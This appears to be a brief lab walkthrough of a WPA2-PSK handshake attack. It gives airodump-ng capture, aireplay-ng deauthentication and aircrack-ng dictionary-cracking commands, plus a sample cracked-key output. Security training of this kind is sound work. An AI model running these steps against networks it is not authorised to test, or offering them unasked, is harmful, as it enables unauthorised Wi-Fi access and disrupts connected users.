# WPA2 PSK Handshake Attack
## Terminal 1 - Capture Handshake
``` 
sudo airodump-ng -c 1 --bssid 28:05:A5:07:E4:21 -w cap_lab_wpa2 wlx98ded00fb9d3
```

This command starts capturing packets on the target network. Connect to the network and note the MAC address that appears at the bottom of the airodump-ng screen.

## Terminal 2 - Deauth Attack

Send deauthentication packets to force the connected device to reconnect and generate a new handshake:

```
sudo aireplay-ng --deauth 10 -a 28:05:A5:07:E4:21 -c [YOUR_DEVICE_MAC] wlx98ded00fb9d3
```
Parameters:

- --deauth 10: Send 10 deauth packets

- -a: Access point MAC (router)

- -c: Client MAC (your phone)

- Interface: wlx98ded00fb9d3

Check for Handshake

When a handshake is captured, you will see "WPA handshake:" appear in the top right corner of the airodump-ng terminal.
text

Example: 
```
[ WPA handshake: 26:03:A1:04:E2:21 ]
```
Crack the Password

Once the handshake is captured, use aircrack-ng with a wordlist:
```
aircrack-ng -w rockyou.txt cap_lab_wpa2-01.cap
```

Success output:

```
                                   Aircrack-ng 1.7 

          [00:00:00] 12/10303727 keys tested (758.65 k/s) 

          Time left: 3 hours, 46 minutes, 21 seconds                 0.00%

                               KEY FOUND! [ 12345678 ]
```
